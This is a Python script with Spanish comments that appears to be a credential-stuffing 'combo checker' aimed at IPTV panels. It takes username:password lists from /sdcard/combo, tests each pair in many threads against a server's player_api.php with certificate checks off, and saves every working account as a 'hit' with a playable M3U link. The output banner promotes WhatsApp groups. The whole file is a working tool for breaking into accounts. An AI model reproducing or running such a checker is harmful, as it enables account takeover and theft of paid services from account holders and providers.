import os
import sys
import time
import datetime
import re
import threading
import pathlib

# Instalar requests si no está
try:
    import requests
except ImportError:
    print("Instalando requests...")
    os.system(f"{sys.executable} -m pip install requests")
    import requests

# Deshabilitar advertencias SSL
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Colores ANSI
C = "\33[36m"
R = "\33[31m"
V = "\33[32m"
A = "\33[33m"
F = "\33[0m"

# Banner
banner = f"""
{C}                                      
  🐋⚔️ 𝐌𝟑𝐮 🆁🆄🅰🅷 🆂🅴🆇🆈 𝟐𝟎𝟐6 ⚔️🐋              
                                      
{V} 🐋⚔️𝕤𝕠𝕝𝕠 𝕡𝕒𝕣𝕒 𝕘𝕦𝕒𝕡𝕠𝕤 𝕪 𝕤𝕖𝕩𝕪 𝐛𝐲 🅡🅤🅐🅗 𝟐𝟎𝟐6 ⚔️🐋       
{F}"""
print(banner)

# ---------- CONFIGURACIÓN DE RUTAS ----------
COMBO_DIR = "/sdcard/combo/"
os.makedirs(COMBO_DIR, exist_ok=True)   # crear si no existe

# Listar archivos .txt en COMBO_DIR
combos = [f for f in os.listdir(COMBO_DIR) if f.endswith('.txt')]
if not combos:
    print(f"{R}No hay archivos .txt en {COMBO_DIR}{F}")
    sys.exit(1)

print(f"{A}Combos disponibles:{F}")
for i, arch in enumerate(combos, 1):
    print(f"  {i} - {arch}")
opcion = input(f"{C}Selecciona número: {F}")
try:
    combo_file = combos[int(opcion)-1]
    combo_path = os.path.join(COMBO_DIR, combo_file)
except:
    print(f"{R}Opción inválida{F}")
    sys.exit(1)

os.system('clear')
print(banner)
print(f"{V}Combo seleccionado: {combo_file}{F}")

# ---------- NÚMERO DE BOTS ----------
try:
    bots = int(input(f"{C}Número de bots (1-15): {F}"))
    bots = max(1, min(bots, 15))
except:
    bots = 5

# ---------- SERVIDOR IPTV ----------
panel = input(f"{C}URL:puerto (ej: servidor.com:8080): {F}")
panel = panel.replace("http://", "").replace("https://", "").strip("/")
portal = panel
fx = portal.replace(':', '_')   # para nombre de archivo

# ¿Incluir categorías? (El usuario pidió NO, pero mantenemos la opción)
incluir_cats = input(f"{C}Incluir categorías? (1=Si / 2=No): {F}")
incluir_cats = (incluir_cats == "1")

os.system('clear')
print(banner)

# ---------- LEER COMBO ----------
try:
    with open(combo_path, 'r', encoding='utf-8', errors='ignore') as f:
        lineas = f.readlines()
except Exception as e:
    print(f"{R}Error al leer combo: {e}{F}")
    sys.exit(1)

total = len(lineas)
print(f"{V}Total cuentas: {total} | Bots: {bots}{F}")

# ---------- HEADERS ----------
headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
}

# ---------- FUNCIÓN PARA ESCRIBIR RESULTADOS ----------
def guardar_hit(texto):
    archivo = f"/sdcard/Ⓜ️3U ⚔️{fx}.txt"
    with open(archivo, 'a', encoding='utf-8') as f:
        f.write(texto + "\n")

# ---------- FUNCIÓN QUE PROCESA UNA CUENTA ----------
def procesar(user, pas, num_linea):
    global hit_count
    url = f"http://{portal}/player_api.php?username={user}&password={pas}"
    try:
        resp = requests.get(url, headers=headers, timeout=10, verify=False)
        if resp.status_code != 200:
            return
        data = resp.text
        if '"status":"Active"' not in data:
            return
        
        # Extraer datos
        try:
            status = data.split('"status":"')[1].split('"')[0]
            exp = data.split('"exp_date":"')[1].split('"')[0]
            if exp == "null":
                exp = "Unlimited"
            else:
                exp = datetime.datetime.fromtimestamp(int(exp)).strftime('%Y-%m-%d %H:%M:%S')
            active_cons = data.split('"active_cons":"')[1].split('"')[0]
            max_cons = data.split('"max_connections":"')[1].split('"')[0]
            timezone = data.split('"timezone":"')[1].split('"')[0].replace("\\/", "/")
            realm = data.split('"url":"')[1].split('"')[0]
        except:
            return
        
        # Contar canales (opcional)
        canales = "?"
        pelis = "?"
        series = "?"
        if incluir_cats:
            try:
                r = requests.get(f"{url}&action=get_live_streams", timeout=8)
                canales = str(r.text.count("stream_id"))
                r = requests.get(f"{url}&action=get_vod_streams", timeout=8)
                pelis = str(r.text.count("stream_id"))
                r = requests.get(f"{url}&action=get_series", timeout=8)
                series = str(r.text.count("series_id"))
            except:
                pass
        
        m3u = f"http://{portal}/get.php?username={user}&password={pas}&type=m3u_plus"
        
        # Formato limpio SIN emojis y SIN categorías (como pide el usuario)
        salida = f"""================================
𝐌𝟑𝐮 RUAH SEXY CHILE 𝟐𝟎𝟐6 
          SOLO PARA GUAPOS Y SEXY 𝐛𝐲 ruah 𝟐𝟎𝟐6
╭─ 𝗛𝗶𝘁𝘀 𝗯𝘆  RUAH-SEXY 𝟐𝟎𝟐6 
├── Host http://{portal}
├── Dominio http://{realm}
├── User  {user}
├── Pass - {pas}
├── Exp. -  {exp}
├── Act Con - {active_cons}
├── Max Con - {max_cons}
├── Status {status}
╰─Zona {timezone}   

╭─Chanel info
├  CANALES EN VIVO {canales}
├  VIDEOS  Y  PELIS    {pelis}
├  SERIES VARIADAS   {series}
╰─   

╭─ 🄼➂🅄 
├  {m3u} 

╭─ Únete a nuestros grupos de WhatsApp:
├ https://chat.whatsapp.com/GwNviW1q5PwBxG6j3VT1pR?mode=gi_t
╰ https://chat.whatsapp.com/LY53sUsPr466w3zxlXEie4?mode=gi_t
"""
        guardar_hit(salida)
        hit_count += 1
        print(f"{V}[HIT #{hit_count}] {user}:{pas}{F}")
        print(salida)
    except Exception:
        pass

# ---------- FUNCIÓN QUE REPARTE EL TRABAJO ENTRE BOTS ----------
hit_count = 0
linea_actual = 0
lock = threading.Lock()

def trabajador(id_bot):
    global linea_actual, hit_count
    while True:
        with lock:
            idx = linea_actual
            linea_actual += 1
        if idx >= total:
            break
        linea = lineas[idx].strip()
        if not linea or ':' not in linea:
            continue
        user, pas = linea.split(':', 1)
        user = user.strip()
        pas = pas.strip()
        # Mostrar progreso (opcional)
        porcentaje = (idx + 1) * 100 // total
        sys.stdout.write(f"\r{C}Bot {id_bot}: {porcentaje}% completado | Hits: {hit_count}{F}")
        sys.stdout.flush()
        procesar(user, pas, idx)

# ---------- INICIAR HILOS ----------
hilos = []
for i in range(bots):
    t = threading.Thread(target=trabajador, args=(i+1,))
    t.daemon = True
    t.start()
    hilos.append(t)

for t in hilos:
    t.join()

print(f"\n{V}Escaneo completado. Total hits: {hit_count}{F}")
print(f"{V}Resultados guardados en /sdcard/Ⓜ️3U ⚔️{fx}.txt{F}")